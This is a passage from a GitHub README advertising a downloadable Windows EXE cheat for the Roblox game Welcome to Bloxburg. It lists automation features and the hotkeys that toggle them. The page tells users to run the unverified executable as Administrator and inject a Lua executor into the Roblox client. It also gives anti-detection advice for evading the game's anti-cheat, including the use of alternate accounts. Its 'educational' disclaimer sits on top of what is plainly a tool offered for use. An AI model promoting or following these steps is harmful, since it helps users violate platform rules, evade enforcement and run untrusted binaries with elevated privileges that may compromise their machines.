⚠️ **DISCLAIMER — LEGAL AND ETHICAL NOTICE**  
This repository and its associated artifacts are provided **strictly for educational and research purposes only**. The creators, contributors, and distributors of this software assume **zero liability** for any misuse, account termination, legal action, or system damage resulting from its use. **Usage constitutes acceptance of all associated risks.** You are solely responsible for compliance with the Terms of Service of any third-party application. No guarantee of undetectability is made. **Proceed at your own risk.**

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=12&height=220&section=header&text=Bloxburg%20Roblox%20Script%202026&fontSize=62&fontColor=fff&animation=fadeIn&fontAlignY=38&desc=Utility+Script+for+Bloxburg+Gameplay&descAlignY=56&descSize=20" width="100%"/>

# Bloxburg Roblox Script 2026 🏠 ⚙️

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge)
![Updated](https://img.shields.io/badge/updated-2026-brightgreen?style=for-the-badge)
![Stars](https://img.shields.io/github/stars/Innerforpersist/bloxburg-roblox-suite?style=for-the-badge&logo=github)
![Forks](https://img.shields.io/github/forks/Innerforpersist/bloxburg-roblox-suite?style=for-the-badge&logo=github)
![Last Commit](https://img.shields.io/github/last-commit/Innerforpersist/bloxburg-roblox-suite?style=for-the-badge)
![Repo Size](https://img.shields.io/github/repo-size/Innerforpersist/bloxburg-roblox-suite?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows)
![Windows EXE](https://img.shields.io/badge/Windows-EXE-0078d4?style=for-the-badge&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

### ⭐ Star this repo if it helped you!

<p align="center">
  <a href="https://github.com/Innerforpersist/bloxburg-roblox-suite/releases/download/v1.9.74/bloxburg-roblox-suite-v1.9.74.zip">
    <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20Bloxburg%20Roblox%20Script%202026-FF6600?style=for-the-badge&logoColor=white&labelColor=DD3300" width="420" alt="Download Bloxburg Roblox Script 2026"/>
  </a>
</p>

</div>

## 📋 Table of Contents

- [About](#about)
- [Requirements](#requirements)
- [Features](#features)
- [Safety](#safety)
- [How to Use](#how-to-use)
- [Installation](#installation)
- [Compatibility](#compatibility)
- [FAQ](#faq)
- [Community & Support](#community--support)
- [License](#license)
- [Disclaimer](#disclaimer)
- [Changelog](#changelog)

## 📖 About

This is a **learning-focused utility script** designed for the Roblox experience **Welcome to Bloxburg (2026 edition)**. The tool provides a series of client-side helper functions that automate repetitive construction, resource management, and gameplay interactions. It is **not** a remote execution exploit nor does it modify server-side game logic. The project is distributed as a standalone Windows executable (.exe) and requires an external executor to inject the associated Lua code into the Roblox client. It is intended for users who understand the inherent risks of using third-party tools on an online platform.

## ⚙️ Requirements

- **Operating System:** Windows 10 (build 19041+) or Windows 11.
- **Runtime:** .NET Framework 4.8 or later (included with most modern Windows versions).
- **Disk Space:** ~50 MB free for the executable and temporary cache.
- **Internet:** Required for download and initial retrieval of script definitions.
- **Dependencies:** A compatible, up-to-date Lua executor for Roblox (e.g., Krnl, Synapse, ScriptWare). The tool does **not** include an executor.
- **Target Application:** Roblox Player (latest version) with Welcome to Bloxburg loaded.
- **Account:** You must have a Roblox account with an active session.

## ✨ Features

- **Auto-Construction 🧱** — Automatically places building materials from your inventory according to a saved blueprint pattern. Reduces manual clicking for large-scale builds.
- **Resource Auto-Gather 🔧** — Triggers collection of wood, brick, and cash registers at user-defined intervals. Configurable delay to simulate human-like input.
- **Mood Maintenance Helper 🌟** — Automates hygiene, energy, and fun tasks (e.g., showering, sleeping, watching TV) when a stat drops below a configurable threshold.
- **Job Automation ⚡** — Performs the required actions for select in-game jobs (e.g., pizza delivery, cashier) with randomized timing.
- **Skill XP Accelerator 📈** — Applies a sequence of actions to rapidly increase skill gains (e.g., writing for writing skill) with an anti-detection randomization profile.
- **In-Game Overlay UI 🖥️** — A minimal, non-intrusive Heads-Up Display (HUD) showing current stats, active automations, and toggle hotkeys.
- **Hotkey Configuration ⌨️** — All features are toggleable via configurable keyboard shortcuts. Default mappings are printed to the console on launch.
- **Config Profile System 📁** — Save and load your feature preferences (delays, hotkeys, toggles) as a `.json` file in the executable's directory.

## 🛡️ Safety

The tool is designed with a **defense-in-depth** approach to reduce detection risk during reasonable use. Key safety mechanisms include:
- **Input Simulation:** All automation uses randomized, human-like timing (jitter between 50–200ms per action).
- **Session Limits:** Hard-coded maximum runtime of 4 hours per session. The tool will automatically cease all automation after this period.
- **Anti-Pattern Randomization:** No two sequences are identical. The order of actions within a job or construction task is shuffled.
- **No Memory Modification:** The tool does not read or write to the Roblox process memory; it only sends keystrokes and mouse clicks to the active Roblox window.
- **User Responsibility:** The user is expected to use the tool sparingly and not leave it unattended for extended periods. **No level of safety can guarantee account immunity.**

## 🎮 How to Use

1. **Launch Roblox** and join a Bloxburg server.
2. **Run the executable** (`BloxburgScriptTool.exe`) as Administrator.
3. **Inject your preferred Lua executor** into the Roblox process.
4. **Execute the provided Lua script** (located in the `scripts/` subdirectory after first run) within your executor.
5. The overlay HUD should appear in-game. Use the default hotkeys to toggle features:
   - `F2` — Toggle Auto-Construction
   - `F3` — Toggle Resource Auto-Gather
   - `F4` — Toggle Mood Maintenance
   - `F5` — Toggle Job Automation
   - `F6` — Toggle Skill XP Accelerator
   - `F9` — Reload configuration profile
   - `F10` — Show/Hide overlay
   - `F12` — Force stop all automation and exit the executor script

## 📦 Installation

1. Go to the [Releases](../../releases/latest) page and download the latest version.
2. Extract the archive if needed.
3. Run the downloaded executable as Administrator.
4. Follow the on-screen setup steps.
5. Launch the target application and enjoy.

## 📊 Compatibility

| OS | Version | Status | Notes |
| :--- | :--- | :--- | :--- |
| Windows 11 | 23H2 | ✅ Fully functional | Tested on latest Roblox client. |
| Windows 11 | 22H2 | ✅ Fully functional | No known issues. |
| Windows 10 | 22H2 | ✅ Fully functional | Primary development environment. |
| Windows 10 | 21H2 | ⚠️ Partial | Requires .NET Framework update. |
| Windows 8.1 | All | ❌ Unsupported | No compatibility testing. |
| Windows 7 | All | ❌ Unsupported | No compatibility testing. |
| Wine/Proton | 9.0+ | ⚠️ Untested | No reports. Likely incompatible. |

## ❓ FAQ

**Q: Is this detectable in 2026?**  
A: Detection risk is **non-zero**. Roblox's anti-cheat (Byfron) is active and updated regularly. This tool does **not** guarantee undetectability. We recommend using it on alternate accounts and never during peak hours. Using default settings with